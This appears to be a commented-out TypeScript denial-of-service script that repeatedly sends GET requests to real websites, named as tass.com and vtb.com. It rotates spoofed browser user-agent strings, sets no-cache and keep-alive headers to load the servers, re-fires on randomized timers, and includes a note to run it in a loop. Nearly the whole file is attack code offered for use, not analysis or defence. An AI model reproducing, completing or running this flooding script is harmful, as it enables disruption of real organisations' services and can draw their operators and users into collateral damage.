
// ///URL LIST HERE
// let agents = [
//   "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
//   "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
//   "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
//   "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
//   "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
//   "Mozilla/5.0 (iPhone; CPU iPhone OS 1å1_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
//   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
//   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
// ];

// export const targets = [
//     {
//         name: "Tass", 
//         urls: [
//             "https://tass.com",
//             "https://tass.com",
//         ]
//     },
//     {
//         name: "VTB", 
//         urls: [
//             "https://vtb.com"
//         ]
//     }
// ];



// //NEEDS TO GO IN WHILE
// targets.map((target) => hitTarget(target));
// const maxTimeout = 30;

// export async function  hitTarget(target: { name: string, urls: string[]}) {
//   let rngAgent = agents[Math.floor(Math.random() * agents.length)];

//   for await (const url of target.urls) {
//     ky.get(url, {
//       headers: {
//         "User-Agent": rngAgent,
//         "accept": "*/*", 
//         "accept-encoding": "",
//         "accept-language":"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
//         "cache-control":  "no-cache",
//         "pragma": "no-cache",
//         "Connection": "keep-alive",
//         "Keep-Alive": "timeout=100, max=100"
//       }
//     })
//   }

//   // target.urls.map(url =>{
//   // // axios.get(url, {
//   // //     headers: { 
//   // //         "User-Agent": rngAgent, 
//   // //         "accept": "*/*", 
//   // //         "accept-encoding": "",
//   // //         "accept-language":"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
//   // //         "cache-control":  "no-cache",
//   // //         "pragma": "no-cache"                     
//   // //      },
//   // //      httpsAgent: new https.Agent({ keepAlive: true, keepAliveMsecs:  (Math.floor(Math.random() * 90) + 90)*1000})
//   // //   }).then(
//   // //       (res) => console.log(target.name, res.status)
//   // //   )});
//   setTimeout(()=>hitTarget(target),  (Math.floor(Math.random() * 15) + 15) * 1000);
// }

// console.log("Hi!");


